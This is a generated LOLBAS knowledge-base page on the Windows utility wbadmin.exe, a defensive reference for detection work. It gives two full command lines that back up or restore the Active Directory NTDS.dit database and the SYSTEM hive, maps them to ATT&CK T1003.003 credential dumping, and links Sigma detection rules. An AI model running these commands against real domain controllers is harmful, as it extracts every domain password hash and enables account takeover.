---
title: "wbadmin.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Wbadmin.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wbadmin.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "wbadmin.exe"
functions:
  - "Dump"
attack_technique_ids:
  - "T1003.003"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Windows Backup Administration utility

## Paths

- `C:\Windows\System32\wbadmin.exe`

## Commands

### 1. Dump

Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)

```cmd
wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
```

- Use Case: Snapshoting of Active Directory NTDS.dit database
- Privileges: Administrator, Backup Operators, SeBackupPrivilege
- Operating System: Windows Server
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping#^t1003003-ntds|T1003.003: NTDS]]

### 2. Dump

Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.

```cmd
wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
```

- Use Case: Dumping of Active Directory NTDS.dit database
- Privileges: Administrator, Backup Operators, SeBackupPrivilege
- Operating System: Windows Server
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping#^t1003003-ntds|T1003.003: NTDS]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml
- IOC: wbadmin.exe command lines containing "NTDS" or "NTDS.dit"

## Resources

- {'Link': 'https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wbadmin.yml)
